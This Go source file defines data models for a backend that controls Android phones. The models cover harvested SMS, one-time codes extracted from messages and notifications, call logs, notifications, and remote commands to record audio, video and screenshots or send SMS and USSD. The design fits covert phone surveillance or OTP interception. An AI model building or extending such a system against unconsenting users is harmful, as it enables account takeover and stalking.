package domain

import (
	"encoding/json"
	"time"

	"github.com/google/uuid"
)

type UserRole string

const (
	RoleAdmin    UserRole = "admin"
	RoleOperator UserRole = "operator"
	RoleViewer   UserRole = "viewer"
)

type DeviceStatus string

const (
	DeviceOnline   DeviceStatus = "online"
	DeviceOffline  DeviceStatus = "offline"
	DeviceDisabled DeviceStatus = "disabled"
)

type User struct {
	ID           uuid.UUID `json:"id"`
	Email        string    `json:"email"`
	PasswordHash string    `json:"-"`
	DisplayName  string    `json:"display_name"`
	Role         UserRole  `json:"role"`
	IsActive     bool      `json:"is_active"`
	CreatedAt    time.Time `json:"created_at"`
	UpdatedAt    time.Time `json:"updated_at"`
}

type Device struct {
	ID             uuid.UUID       `json:"id"`
	OwnerID        uuid.UUID       `json:"owner_id"`
	DeviceUUID     string          `json:"device_uuid"`
	Name           string          `json:"name"`
	APIKeyHash     string          `json:"-"`
	APIKeyPrefix   string          `json:"api_key_prefix"`
	Status         DeviceStatus    `json:"status"`
	Manufacturer   string          `json:"manufacturer"`
	Model          string          `json:"model"`
	AndroidVersion string          `json:"android_version"`
	AppVersion     string          `json:"app_version"`
	LastSeenAt     *time.Time      `json:"last_seen_at,omitempty"`
	Metadata       json.RawMessage `json:"metadata"`
	CreatedAt      time.Time       `json:"created_at"`
	UpdatedAt      time.Time       `json:"updated_at"`
}

type DeviceHeartbeat struct {
	ID             int64           `json:"id"`
	DeviceID       uuid.UUID       `json:"device_id"`
	BatteryLevel   *int            `json:"battery_level,omitempty"`
	IsCharging     *bool           `json:"is_charging,omitempty"`
	StorageFreeMB  *int64          `json:"storage_free_mb,omitempty"`
	RAMFreeMB      *int64          `json:"ram_free_mb,omitempty"`
	CPUUsage       *float64        `json:"cpu_usage,omitempty"`
	NetworkType    string          `json:"network_type,omitempty"`
	WifiSSID       string          `json:"wifi_ssid,omitempty"`
	SignalStrength *int            `json:"signal_strength,omitempty"`
	SIMInfo        json.RawMessage `json:"sim_info"`
	Payload        json.RawMessage `json:"payload"`
	ReportedAt     time.Time       `json:"reported_at"`
}

type SMSDirection string

const (
	SMSInbound  SMSDirection = "inbound"
	SMSOutbound SMSDirection = "outbound"
)

type SMSMessage struct {
	ID          uuid.UUID    `json:"id"`
	DeviceID    uuid.UUID    `json:"device_id"`
	Direction   SMSDirection `json:"direction"`
	Address     string       `json:"address"`
	Body        string       `json:"body"`
	SIMSlot     int          `json:"sim_slot"`
	Status      string       `json:"status"`
	ProviderRef string       `json:"provider_ref,omitempty"`
	DeliveredAt *time.Time   `json:"delivered_at,omitempty"`
	CreatedAt   time.Time    `json:"created_at"`
}

type OTPSource string

const (
	OTPSourceSMS          OTPSource = "sms"
	OTPSourceNotification OTPSource = "notification"
)

type OTPEvent struct {
	ID        uuid.UUID `json:"id"`
	DeviceID  uuid.UUID `json:"device_id"`
	Source    OTPSource `json:"source"`
	Sender    string    `json:"sender"`
	OTPCode   string    `json:"otp_code"`
	RawText   string    `json:"raw_text"`
	Pattern   string    `json:"pattern"`
	CreatedAt time.Time `json:"created_at"`
}

type NotificationEvent struct {
	ID          uuid.UUID       `json:"id"`
	DeviceID    uuid.UUID       `json:"device_id"`
	PackageName string          `json:"package_name"`
	Title       string          `json:"title"`
	Text        string          `json:"text"`
	Payload     json.RawMessage `json:"payload"`
	PostedAt    time.Time       `json:"posted_at"`
	CreatedAt   time.Time       `json:"created_at"`
}

type CallType string

const (
	CallIncoming CallType = "incoming"
	CallOutgoing CallType = "outgoing"
	CallMissed   CallType = "missed"
)

type CallEvent struct {
	ID          uuid.UUID  `json:"id"`
	DeviceID    uuid.UUID  `json:"device_id"`
	CallType    CallType   `json:"call_type"`
	Number      string     `json:"number"`
	State       string     `json:"state"`
	DurationSec int        `json:"duration_sec"`
	StartedAt   *time.Time `json:"started_at,omitempty"`
	CreatedAt   time.Time  `json:"created_at"`
}

type CommandStatus string

const (
	CommandQueued    CommandStatus = "queued"
	CommandSent      CommandStatus = "sent"
	CommandAcked     CommandStatus = "acked"
	CommandRunning   CommandStatus = "running"
	CommandSucceeded CommandStatus = "succeeded"
	CommandFailed    CommandStatus = "failed"
	CommandCancelled CommandStatus = "cancelled"
)

// Supported remote command types.
const (
	CmdPing              = "ping"
	CmdSync              = "sync"
	CmdRestartServices   = "restart_services"
	CmdRefreshConfig     = "refresh_config"
	CmdClearCache        = "clear_cache"
	CmdUploadLogs        = "upload_logs"
	CmdUpdateConfig      = "update_config"
	CmdRecordAudio       = "record_audio"
	CmdRecordVideo       = "record_video"
	CmdTakeScreenshot    = "take_screenshot"
	CmdSendSMS           = "send_sms"
	CmdUSSD              = "ussd"
)

type Command struct {
	ID           uuid.UUID       `json:"id"`
	DeviceID     uuid.UUID       `json:"device_id"`
	CreatedBy    *uuid.UUID      `json:"created_by,omitempty"`
	CommandType  string          `json:"command_type"`
	Payload      json.RawMessage `json:"payload"`
	Status       CommandStatus   `json:"status"`
	Result       json.RawMessage `json:"result"`
	ErrorMessage string          `json:"error_message,omitempty"`
	QueuedAt     time.Time       `json:"queued_at"`
	SentAt       *time.Time      `json:"sent_at,omitempty"`
	CompletedAt  *time.Time      `json:"completed_at,omitempty"`
}

type MediaType string

const (
	MediaAudio      MediaType = "audio"
	MediaVideo      MediaType = "video"
	MediaScreenshot MediaType = "screenshot"
)

type MediaUpload struct {
	ID             uuid.UUID  `json:"id"`
	DeviceID       uuid.UUID  `json:"device_id"`
	CommandID      *uuid.UUID `json:"command_id,omitempty"`
	MediaType      MediaType  `json:"media_type"`
	StoragePath    string     `json:"-"`
	ContentType    string     `json:"content_type"`
	SizeBytes      int64      `json:"size_bytes"`
	ChecksumSHA256 string     `json:"checksum_sha256"`
	CreatedAt      time.Time  `json:"created_at"`
	DeletedAt      *time.Time `json:"deleted_at,omitempty"`
}

type WebhookEndpoint struct {
	ID         uuid.UUID `json:"id"`
	OwnerID    uuid.UUID `json:"owner_id"`
	Name       string    `json:"name"`
	URL        string    `json:"url"`
	Secret     string    `json:"-"`
	EventTypes []string  `json:"event_types"`
	IsActive   bool      `json:"is_active"`
	CreatedAt  time.Time `json:"created_at"`
	UpdatedAt  time.Time `json:"updated_at"`
}

type AuditLog struct {
	ID           int64           `json:"id"`
	ActorType    string          `json:"actor_type"`
	ActorID      string          `json:"actor_id"`
	Action       string          `json:"action"`
	ResourceType string          `json:"resource_type"`
	ResourceID   string          `json:"resource_id"`
	Metadata     json.RawMessage `json:"metadata"`
	IPAddress    string          `json:"ip_address"`
	CreatedAt    time.Time       `json:"created_at"`
}
